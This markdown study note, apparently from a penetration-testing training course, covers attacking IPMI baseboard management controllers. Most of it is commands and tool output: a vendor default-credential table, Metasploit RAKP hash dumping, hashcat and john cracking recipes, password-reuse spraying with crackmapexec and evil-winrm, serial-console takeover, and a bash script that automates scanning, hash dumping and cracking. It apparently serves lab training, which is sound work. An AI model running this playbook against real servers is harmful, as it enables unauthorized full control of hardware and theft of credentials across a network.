---
tags: [module/footprinting, ipmi, bmc, hardware, management, level/advanced, practical]
---

# IPMI Enumeration - Practical Application

## Complete IPMI Enumeration Workflow

Phase 1: Service Discovery
Phase 2: Version Fingerprinting
Phase 3: Default Credential Testing
Phase 4: Hash Dumping (RAKP Flaw)
Phase 5: Offline Hash Cracking
Phase 6: Password Re-use Testing
Phase 7: BMC Access and Exploitation

---

## Phase 1: Service Discovery

### Nmap UDP Scan

nmap -sU -p623 --open 10.129.42.195

### Nmap IPMI Scripts

ls /usr/share/nmap/scripts/ipmi-*

Key scripts:
- ipmi-version.nse - Get IPMI version
- ipmi-cipher-zero.nse - Check for cipher zero vulnerability

### Comprehensive IPMI Scan

nmap -sU -p623 --script ipmi-* 10.129.42.195 -oN ipmi-nmap.txt

---

## Phase 2: Version Fingerprinting

### Nmap Version Detection

sudo nmap -sU --script ipmi-version -p 623 10.129.42.195

Output:
623/udp open  asf-rmcp
| ipmi-version:
|   Version: IPMI-2.0
|   UserAuth: auth_msg, auth_user, non_null_user
|   PassAuth: password, md5, md2, null
|_  Level: 1.5, 2.0

### Metasploit Version Scan

use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.42.195
run

Output:
[+] 10.129.42.195:623 - IPMI-2.0 UserAuth(...) PassAuth(...)

### What Version Info Tells Us

- IPMI v2.0 is vulnerable to RAKP hash disclosure
- Authentication methods supported
- Cipher suite support

---

## Phase 3: Default Credential Testing

### Common Default Credentials

| Vendor | Username | Password |
|--------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | (random 8-char) |
| Supermicro | ADMIN | ADMIN |
| IBM IMM | USERID | PASSW0RD |
| Fujitsu iRMC | admin | admin |
| Cisco UCS | admin | password |

### Test Web Interface

https://10.129.42.195
https://10.129.42.195:443
https://10.129.42.195:8443

### Test SSH/Telnet Access

ssh Administrator@10.129.42.195
telnet 10.129.42.195

### Test IPMI Protocol Access

Use ipmitool:
ipmitool -H 10.129.42.195 -U ADMIN -P ADMIN user list

---

## Phase 4: Hash Dumping (RAKP Flaw)

### The Vulnerability

In IPMI 2.0, during RAKP authentication, the server sends a salted SHA1/MD5 hash of the user's password BEFORE authentication completes.

ANY valid username will return a hash - no password needed.

### Metasploit Hash Dump

use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts 10.129.42.195
set output_format hashcat
run

Output:
[+] 10.129.42.195:623 - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - Hash for user 'ADMIN' matches password 'ADMIN'

### Dump Hashes for Multiple Users

set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt
run

### Dump Hashes with ipmitool

ipmitool -H 10.129.42.195 -U ADMIN -P invalid user list

This may trigger hash disclosure.

### Save Hashes for Cracking

Save in Hashcat format:
user:hash:salt

Example:
ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e

---

## Phase 5: Offline Hash Cracking

### Hashcat Mode 7300

hashcat -m 7300 ipmi-hashes.txt -a 0 /usr/share/wordlists/rockyou.txt

### Mask Attack for HP iLO Default

HP iLO default passwords are 8 characters, uppercase letters and numbers only.

hashcat -m 7300 ipmi-hashes.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

### John the Ripper

john --format=ipmi2 --wordlist=/usr/share/wordlists/rockyou.txt ipmi-hashes.txt

### Rule-Based Attacks

hashcat -m 7300 ipmi-hashes.txt -a 0 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

### Known Defaults Wordlist

Create a wordlist of common IPMI passwords:
echo -e "calvin\nADMIN\nPASSW0RD\nadmin\npassword" > ipmi-defaults.txt

hashcat -m 7300 ipmi-hashes.txt -a 0 ipmi-defaults.txt

---

## Phase 6: Password Re-use Testing

### Why Password Re-use Matters

We've seen environments where:
1. IPMI hash cracked to reveal a unique password
2. Same password used for root on other servers
3. Same password used for web consoles
4. Same password used for network devices

### Test Cracked Password on Other Services

ssh root@target -p password
ssh administrator@target -p password
mysql -u root -p password -h target
smbclient -L //target -U administrator%password
crackmapexec smb target -u administrator -p password

### Test Password on Web Interfaces

curl -u admin:password https://target/admin
curl -u administrator:password https://target:8443

### Check for Domain Password Re-use

crackmapexec smb domain-controller -u administrator -p password
evil-winrm -i target -u administrator -p password

---

## Phase 7: BMC Access and Exploitation

### Web Interface Access

If you have credentials, access the web console:
- Dell iDRAC: https://10.129.42.195
- HP iLO: https://10.129.42.195
- Supermicro: https://10.129.42.195

### What You Can Do in BMC

- Remote console (KVM) access
- Mount ISO images
- Power cycle server
- Access system logs
- Change boot order
- BIOS configuration
- Sensor monitoring

### Remote ISO Mount

Mount a live ISO and boot from it to reset passwords or access files.

### Extract Configuration

Download BMC configuration:
- May contain other passwords
- Network configuration
- SNMP community strings
- LDAP/AD integration settings

### Serial Over LAN Console

Access serial console:
ipmitool -H 10.129.42.195 -U ADMIN -P ADMIN sol activate

### Check for Cipher Zero Vulnerability

Some BMCs support cipher zero (no authentication):

nmap -p623 --script ipmi-cipher-zero 10.129.42.195

If vulnerable, you can access without credentials.

---

## Complete IPMI Enumeration Script

Save as ipmi-enum.sh:

#!/bin/bash
HOST=$1
OUTPUT_DIR="ipmi-enum-$HOST"
mkdir -p $OUTPUT_DIR

echo "[*] Starting IPMI enumeration on $HOST"

echo "[*] Nmap UDP scan..."
nmap -sU -p623 --script ipmi-* -oN $OUTPUT_DIR/nmap.txt $HOST

echo "[*] Metasploit version scan..."
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set rhosts $HOST; run; exit" | tee $OUTPUT_DIR/version.txt

echo "[*] Dumping hashes with Metasploit..."
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set rhosts $HOST; set output_format hashcat; run; exit" | tee $OUTPUT_DIR/hashes.txt

echo "[*] Extracting hashes for cracking..."
grep "Hash found" $OUTPUT_DIR/hashes.txt | cut -d' ' -f5- > $OUTPUT_DIR/ipmi-hashes.txt

echo "[*] Attempting default password crack..."
hashcat -m 7300 $OUTPUT_DIR/ipmi-hashes.txt ipmi-defaults.txt --show 2>/dev/null | tee $OUTPUT_DIR/cracked.txt

echo "[*] IPMI enumeration complete. Check $OUTPUT_DIR/"

---

## Hashcat Commands for IPMI

| Attack Type | Command |
|-------------|---------|
| Dictionary | hashcat -m 7300 hashes.txt rockyou.txt |
| HP iLO mask | hashcat -m 7300 hashes.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u |
| Rule-based | hashcat -m 7300 hashes.txt rockyou.txt -r best64.rule |
| Show cracked | hashcat -m 7300 hashes.txt --show |

---

## Tool Comparison

| Tool | Purpose | Best For |
|------|---------|----------|
| Nmap | Discovery | Version detection |
| Metasploit | Hash dumping | Getting hashes |
| Hashcat | Password cracking | Offline cracking |
| ipmitool | BMC interaction | Direct management |
| Web browser | GUI access | Full BMC control |

---

## Key Takeaways

- IPMI runs on UDP port 623
- BMC = physical access equivalent
- Default credentials are common (root:calvin, ADMIN:ADMIN)
- IPMI 2.0 RAKP flaw leaks password hashes
- ANY valid username returns a hash
- Hashes can be cracked offline (Hashcat mode 7300)
- HP iLO default passwords follow pattern (8 chars, uppercase+numbers)
- Password re-use is common after cracking
- BMC access = power cycle, ISO mount, console access
- Always check for IPMI during internal pentests
- Cipher zero vulnerability allows no-auth access
